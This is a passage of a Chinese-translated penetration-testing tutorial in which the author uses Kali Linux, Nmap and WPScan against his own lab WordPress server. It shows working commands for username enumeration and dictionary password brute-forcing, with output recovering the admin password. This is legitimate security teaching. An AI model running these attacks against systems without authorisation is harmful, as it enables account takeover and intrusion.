<!DOCTYPE html>
<html lang="zh">
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="generator" content="Pelican" />
        <title>使用 Linux 安全工具进行渗透测试</title>
        <link rel="stylesheet" href="/theme/css/main.css" />
        <meta name="description" content="Author: Peter Gervase 使用 Kali Linux 和其他开源工具来发现系统中的安全漏洞和弱点。 众多被广泛报道的大型消费企业入侵事件凸显了系 …" />
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">linux_cn</a></h1>
                <nav><ul>
                    <li><a href="/category/chuan-shan-jia-zhuan-fang">穿山甲专访</a></li>
                    <li><a href="/category/dai-ma-ying-xiong">代码英雄</a></li>
                    <li><a href="/category/fen-xiang">分享</a></li>
                    <li><a href="/category/guan-dian">观点</a></li>
                    <li><a href="/category/huo-dong">活动</a></li>
                    <li><a href="/category/ji-ke-man-hua">极客漫画</a></li>
                    <li><a href="/category/ji-zhu">技术</a></li>
                    <li><a href="/category/kai-yuan-zhi-hui">开源智慧</a></li>
                    <li><a href="/category/linux-fa-xing-ban">Linux 发行版</a></li>
                    <li><a href="/category/mei-ri-an-quan-zi-xun">每日安全资讯</a></li>
                    <li><a href="/category/misc">Misc</a></li>
                    <li><a href="/category/qu-kuai-lian">区块链</a></li>
                    <li><a href="/category/rong-qi-yu-yun">容器与云</a></li>
                    <li><a href="/category/ruan-jian-kai-fa">软件开发</a></li>
                    <li><a href="/category/shu-mei-pai">树莓派</a></li>
                    <li class="active"><a href="/category/xi-tong-yun-wei">系统运维</a></li>
                    <li><a href="/category/xin-wen">新闻</a></li>
                    <li><a href="/category/ying-he-guan-cha">硬核观察</a></li>
                    <li><a href="/category/zhi-ye-sheng-ya">职业生涯</a></li>
                    <li><a href="/category/zhong-jiang-ming-dan">中奖名单</a></li>
                    <li><a href="/category/zhuo-mian-ying-yong">桌面应用</a></li>
                </ul></nav>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="/2021/08/shi-yong-linux-an-quan-gong-ju-jin-xing-shen-tou-ce-shi.html" rel="bookmark"
           title="Permalink to 使用 Linux 安全工具进行渗透测试">使用 Linux 安全工具进行渗透测试</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2021-08-05T11:11:00+02:00">
                Published: Thu 05 August 2021
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/linux-fans-from-china.html">linux fans from china</a>
        </address>
<p>In <a href="/category/xi-tong-yun-wei">系统运维</a>.</p>

</footer><!-- /.post-info -->      <p>Author: Peter Gervase</p>
<blockquote>
<p>使用 Kali Linux 和其他开源工具来发现系统中的安全漏洞和弱点。</p>
</blockquote>
<p><img alt="" src="/data/attachment/album/202108/05/111124w66lpuzsc467nlv1.jpg" title="Magnifying glass on code"></p>
<p>众多被广泛报道的大型消费企业入侵事件凸显了系统安全管理的重要性。幸运的是，有许多不同的应用程序可以帮助保护计算机系统。其中一个是 <a href="https://www.kali.org/">Kali</a>，一个为安全和渗透测试而开发的 Linux 发行版。本文演示了如何使用 Kali Linux 来审视你的系统以发现弱点。</p>
<p>Kali 安装了很多工具，它们都是开源的，默认情况下安装了它们会让事情变得更容易。</p>
<p>（LCTT 译注：Kali 及其携带工具只应该用于对自己拥有合法审查权利的系统和设备，任何未经授权的扫描、渗透和攻击均是违法的。本文作者、译者均不承担任何非授权使用的结果。）</p>
<p><img alt="Kali's tools" src="/data/attachment/album/202108/05/111432agz4p47zg19878hb.png" title="Kali's tools"></p>
<p>本文使用的系统是：</p>
<ol>
<li><code>kali.usersts.redhat.com</code>：这是我将用来启动扫描和攻击的系统。它拥有 30GB 内存和 6 个虚拟 CPU（vCPU）。</li>
<li><code>vulnerable.usersys.redhat.com</code>: 这是一个 Red Hat 企业版 Linux 8 系统，它会成为目标。它拥有 16GB 内存和 6 个 vCPU。它是一个相对较新的系统，但有些软件包可能已经过时。</li>
<li>这个系统包括 <code>httpd-2.4.37-30.module+el8.3.0+7001+0766b9e7.x86_64</code>、 <code>mariadb-server-10.3.27-3.module+el8.3.0+8972+5e3224e9.x86_64</code>、 <code>tigervnc-server-1.9.0-15.el8_1.x86_64</code>、 <code>vsftpd-3.0.3-32.el8.x86_64</code> 和一个 5.6.1 版本的 WordPress。</li>
</ol>
<p>我在上面列出了硬件规格，因为一些任务要求很高，尤其是在运行 WordPress 安全扫描程序（<a href="https://wpscan.com/wordpress-security-scanner">WPScan</a>）时对目标系统 CPU 的要求。</p>
<h3>探测你的系统</h3>
<p>首先，我会在目标系统上进行基本的 Nmap 扫描（你可以阅读 <a href="https://www.redhat.com/sysadmin/using-nmap-harden-systems">使用 Nmap 结果帮助加固 Linux 系统</a> 一文来更深入地了解 Nmap）。Nmap 扫描是一种快速的方法，可以大致了解被测系统中哪些端口和服务是暴露的。</p>
<p><img alt="Nmap scan" src="/data/attachment/album/202108/05/111432djyu3tefh7y1uork.png" title="Nmap scan"></p>
<p>默认扫描显示有几个你可能感兴趣的开放端口。实际上，任何开放端口都可能成为攻击者破坏你网络的一种方式。在本例中，端口 21、22、80 和 443 是不错的扫描对象，因为它们是常用服务的端口。在这个早期阶段，我只是在做侦察工作，尽可能多地获取有关目标系统的信息。</p>
<p>我想用 Nmap 侦察 80 端口，所以我使用 <code>-p 80</code> 参数来查看端口 80，<code>-A</code> 参数来获取操作系统和应用程序版本等信息。</p>
<p><img alt="Nmap scan of port 80" src="/data/attachment/album/202108/05/111432k4gboiqz8jobx1y5.png" title="Nmap scan of port 80"></p>
<p>关键信息有：</p>
<div class="highlight"><pre><span></span><code>PORT   STATE SERVICE VERSION
80/tcp open  http       Apache httpd 2.4.37 ((Red Hat Enterprise Linux))
|_http-generator: WordPress 5.6.1
</code></pre></div>

<p>现在我知道了这是一个 WordPress 服务器，我可以使用 WPScan 来获取有关潜在威胁的信息。一个很好的侦察方法是尝试找到一些用户名，使用 <code>--enumerate u</code> 告诉 WPScan 在 WordPress 实例中查找用户名。例如：</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="vm">?</span><span class="n">kali</span><span class="p">)</span><span class="o">-[</span><span class="n">~</span><span class="o">]</span>
<span class="err">└─#</span><span class="w"> </span><span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">vulnerable</span><span class="p">.</span><span class="n">usersys</span><span class="p">.</span><span class="n">redhat</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="w"> </span><span class="n">u</span>
<span class="n">_______________________________________________________________</span>
<span class="w">        </span><span class="n">__</span><span class="w">              </span><span class="n">_______</span><span class="w">   </span><span class="n">_____</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">     </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">____</span><span class="o">|</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w"> </span><span class="o">/|</span><span class="w"> </span><span class="o">|</span><span class="n">__</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">___</span><span class="w">   </span><span class="n">___</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">__</span><span class="w"> </span><span class="err">®</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">___</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">__</span><span class="o">|/</span><span class="w"> </span><span class="n">_</span><span class="err">`</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="err">&#39;</span><span class="n">_</span><span class="w"> </span><span class="err">\</span>
<span class="w">                </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="n">____</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">__</span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span>
<span class="w">                </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w">   </span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w">    </span><span class="o">|</span><span class="n">_____</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="o">|</span><span class="err">\</span><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">_</span><span class="o">|</span>

<span class="w">        </span><span class="n">WordPress</span><span class="w"> </span><span class="n">Security</span><span class="w"> </span><span class="n">Scanner</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">WPScan</span><span class="w"> </span><span class="n">Team</span>
<span class="w">                        </span><span class="n">Version</span><span class="w"> </span><span class="mf">3.8.10</span>
<span class="w">        </span><span class="n">Sponsored</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">Automattic</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">automattic</span><span class="p">.</span><span class="n">com</span><span class="o">/</span>
<span class="w">        </span><span class="nv">@_WPScan_</span><span class="p">,</span><span class="w"> </span><span class="nv">@ethicalhack3r</span><span class="p">,</span><span class="w"> </span><span class="nv">@erwan_lr</span><span class="p">,</span><span class="w"> </span><span class="nv">@firefart</span>
<span class="n">_______________________________________________________________</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">vulnerable</span><span class="p">.</span><span class="n">usersys</span><span class="p">.</span><span class="n">redhat</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="w"> </span><span class="o">[</span><span class="n">10.19.47.242</span><span class="o">]</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Started</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="mi">21</span><span class="err">:</span><span class="mi">38</span><span class="err">:</span><span class="mi">49</span><span class="w"> </span><span class="mi">2021</span>

<span class="n">Interesting</span><span class="w"> </span><span class="n">Finding</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>
<span class="p">...</span>
<span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="k">User</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="nl">Identified</span><span class="p">:</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">admin</span>
<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Author</span><span class="w"> </span><span class="n">Posts</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Display</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="n">Passive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>
<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Confirmed</span><span class="w"> </span><span class="k">By</span><span class="err">:</span>
<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Author</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="n">Brute</span><span class="w"> </span><span class="n">Forcing</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Author</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>
<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Login</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="n">Messages</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">pgervase</span>
<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Found</span><span class="w"> </span><span class="k">By</span><span class="err">:</span><span class="w"> </span><span class="n">Author</span><span class="w"> </span><span class="n">Posts</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Display</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="p">(</span><span class="n">Passive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>
<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Confirmed</span><span class="w"> </span><span class="k">By</span><span class="err">:</span>
<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Author</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="n">Brute</span><span class="w"> </span><span class="n">Forcing</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Author</span><span class="w"> </span><span class="n">Pattern</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>
<span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">Login</span><span class="w"> </span><span class="n">Error</span><span class="w"> </span><span class="n">Messages</span><span class="w"> </span><span class="p">(</span><span class="n">Aggressive</span><span class="w"> </span><span class="n">Detection</span><span class="p">)</span>
</code></pre></div>

<p>这显示有两个用户：<code>admin</code> 和 <code>pgervase</code>。我将尝试使用密码字典来猜测 <code>admin</code> 的密码。密码字典是一个包含很多密码的文本文件。我使用的字典大小有 37G，有 3,543,076,137 行。</p>
<p>就像你可以选择不同的文本编辑器、Web 浏览器和其他应用程序 一样，也有很多工具可以启动密码攻击。下面是两个使用 Nmap 和 WPScan 的示例命令：</p>
<div class="highlight"><pre><span></span><code># nmap -sV --script http-wordpress-brute --script-args userdb=users.txt,passdb=/path/to/passworddb,threads=6 vulnerable.usersys.redhat.com
</code></pre></div>

<div class="highlight"><pre><span></span><code># wpscan --url vulnerable.usersys.redhat.com --passwords /path/to/passworddb --usernames admin --max-threads 50 | tee nmap.txt
</code></pre></div>

<p>这个 Nmap 脚本是我使用的许多脚本之一，使用 WPScan 扫描 URL 只是这个工具可以完成的许多任务之一。你可以用你喜欢的那一个。</p>
<p>WPScan 示例在文件末尾显示了密码：</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="vm">?</span><span class="n">kali</span><span class="p">)</span><span class="o">-[</span><span class="n">~</span><span class="o">]</span>
<span class="err">└─#</span><span class="w"> </span><span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">vulnerable</span><span class="p">.</span><span class="n">usersys</span><span class="p">.</span><span class="n">redhat</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">--</span><span class="n">passwords</span><span class="w"> </span><span class="n">passwords</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">usernames</span><span class="w"> </span><span class="k">admin</span>
<span class="n">_______________________________________________________________</span>
<span class="w">        </span><span class="n">__</span><span class="w">              </span><span class="n">_______</span><span class="w">   </span><span class="n">_____</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">     </span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">____</span><span class="o">|</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w"> </span><span class="o">/|</span><span class="w"> </span><span class="o">|</span><span class="n">__</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">___</span><span class="w">   </span><span class="n">___</span><span class="w">  </span><span class="n">__</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="n">__</span><span class="w"> </span><span class="err">®</span>
<span class="w">        </span><span class="err">\</span><span class="w"> </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">___</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="w"> </span><span class="err">\</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">__</span><span class="o">|/</span><span class="w"> </span><span class="n">_</span><span class="err">`</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="err">&#39;</span><span class="n">_</span><span class="w"> </span><span class="err">\</span>
<span class="w">                </span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="err">\</span><span class="w">  </span><span class="o">/</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">   </span><span class="n">____</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">__</span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span>
<span class="w">                </span><span class="err">\</span><span class="o">/</span><span class="w">  </span><span class="err">\</span><span class="o">/</span><span class="w">   </span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w">    </span><span class="o">|</span><span class="n">_____</span><span class="o">/</span><span class="w"> </span><span class="err">\</span><span class="n">___</span><span class="o">|</span><span class="err">\</span><span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">_</span><span class="o">|</span>

<span class="w">        </span><span class="n">WordPress</span><span class="w"> </span><span class="n">Security</span><span class="w"> </span><span class="n">Scanner</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">WPScan</span><span class="w"> </span><span class="n">Team</span>
<span class="w">                        </span><span class="n">Version</span><span class="w"> </span><span class="mf">3.8.10</span>
<span class="w">        </span><span class="n">Sponsored</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">Automattic</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">automattic</span><span class="p">.</span><span class="n">com</span><span class="o">/</span>
<span class="w">        </span><span class="nv">@_WPScan_</span><span class="p">,</span><span class="w"> </span><span class="nv">@ethicalhack3r</span><span class="p">,</span><span class="w"> </span><span class="nv">@erwan_lr</span><span class="p">,</span><span class="w"> </span><span class="nv">@firefart</span>
<span class="n">_______________________________________________________________</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">vulnerable</span><span class="p">.</span><span class="n">usersys</span><span class="p">.</span><span class="n">redhat</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="w"> </span><span class="o">[</span><span class="n">10.19.47.242</span><span class="o">]</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Started</span><span class="p">:</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">32</span><span class="err">:</span><span class="mi">13</span><span class="w"> </span><span class="mi">2021</span>

<span class="n">Interesting</span><span class="w"> </span><span class="n">Finding</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="err">:</span>

<span class="p">......</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Performing</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">attack</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">Wp</span><span class="w"> </span><span class="n">Login</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">user</span><span class="o">/</span><span class="n">s</span>
<span class="n">Trying</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">redhat</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="err">:</span><span class="mi">57</span><span class="w"> </span><span class="o">&lt;==================================================================================================================&gt;</span><span class="w"> </span><span class="p">(</span><span class="mi">3231</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">3231</span><span class="p">)</span><span class="w"> </span><span class="mf">100.00</span><span class="o">%</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="err">:</span><span class="mi">57</span>
<span class="n">Trying</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">redhat</span><span class="w"> </span><span class="nc">Time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">01</span><span class="err">:</span><span class="mi">57</span><span class="w"> </span><span class="o">&lt;=========================================================</span><span class="w">                                                         </span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="mi">3231</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">6462</span><span class="p">)</span><span class="w"> </span><span class="mf">50.00</span><span class="o">%</span><span class="w">  </span><span class="nl">ETA</span><span class="p">:</span><span class="w"> </span><span class="vm">??</span><span class="err">:</span><span class="vm">??</span><span class="err">:</span><span class="vm">??</span>
<span class="o">[</span><span class="n">SUCCESS</span><span class="o">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">redhat</span><span class="w">                                                                                                                                                                      </span>

<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">Valid</span><span class="w"> </span><span class="n">Combinations</span><span class="w"> </span><span class="k">Found</span><span class="err">:</span>
<span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nl">Username</span><span class="p">:</span><span class="w"> </span><span class="k">admin</span><span class="p">,</span><span class="w"> </span><span class="nl">Password</span><span class="p">:</span><span class="w"> </span><span class="n">redhat</span>

<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">WPVulnDB</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">Token</span><span class="w"> </span><span class="n">given</span><span class="p">,</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">result</span><span class="w"> </span><span class="n">vulnerability</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="k">output</span><span class="p">.</span>
<span class="o">[</span><span class="n">!</span><span class="o">]</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">free</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">token</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="mi">50</span><span class="w"> </span><span class="n">daily</span><span class="w"> </span><span class="n">requests</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">registering</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">wpscan</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">register</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="nl">Finished</span><span class="p">:</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">15</span><span class="w"> </span><span class="mi">2021</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Requests</span><span class="w"> </span><span class="nl">Done</span><span class="p">:</span><span class="w"> </span><span class="mi">3255</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Cached</span><span class="w"> </span><span class="nl">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">34</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Sent</span><span class="p">:</span><span class="w"> </span><span class="mf">1.066</span><span class="w"> </span><span class="n">MB</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Data</span><span class="w"> </span><span class="nl">Received</span><span class="p">:</span><span class="w"> </span><span class="mf">24.513</span><span class="w"> </span><span class="n">MB</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Memory</span><span class="w"> </span><span class="nl">used</span><span class="p">:</span><span class="w"> </span><span class="mf">264.023</span><span class="w"> </span><span class="n">MB</span>
<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Elapsed</span><span class="w"> </span><span class="nc">time</span><span class="err">:</span><span class="w"> </span><span class="mi">00</span><span class="err">:</span><span class="mi">02</span><span class="err">:</span><span class="mi">02</span>
</code></pre></div>

<p>在末尾的“找到有效组合”部分包含了管理员用户名和密码，3231 行只用了两分钟。</p>
<p>我还有另一个字典文件，其中包含 3,238,659,984 行，使用它花费的时间更长并且会留下更多的证据。</p>
<p>使用 Nmap 可以更快地产生结果：</p>
<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="nx">root</span><span class="p">?</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span>
<span class="err">└─#</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">--</span><span class="nx">script</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">wordpress</span><span class="o">-</span><span class="nx">brute</span><span class="w"> </span><span class="o">--</span><span class="nx">script</span><span class="o">-</span><span class="nx">args</span><span class="w"> </span><span class="nx">userdb</span><span class="p">=</span><span class="nx">users</span><span class="p">.</span><span class="nx">txt</span><span class="p">,</span><span class="nx">passdb</span><span class="p">=</span><span class="nx">password</span><span class="p">.</span><span class="nx">txt</span><span class="p">,</span><span class="nx">threads</span><span class="p">=</span><span class="mi">6</span><span class="w"> </span><span class="nx">vulnerable</span><span class="p">.</span><span class="nx">usersys</span><span class="p">.</span><span class="nx">redhat</span><span class="p">.</span><span class="nx">com</span>
<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.91</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2021-02-18 20:48 EST</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">vulnerable</span><span class="p">.</span><span class="nx">usersys</span><span class="p">.</span><span class="nx">redhat</span><span class="p">.</span><span class="nx">com</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.19.47.242</span><span class="p">)</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00015</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">995</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ports</span>
<span class="nx">PORT</span><span class="w">    </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">21</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ftp</span><span class="w">      </span><span class="nx">vsftpd</span><span class="w"> </span><span class="m m-Double">3.0.3</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">      </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">8.0</span><span class="w"> </span><span class="p">(</span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
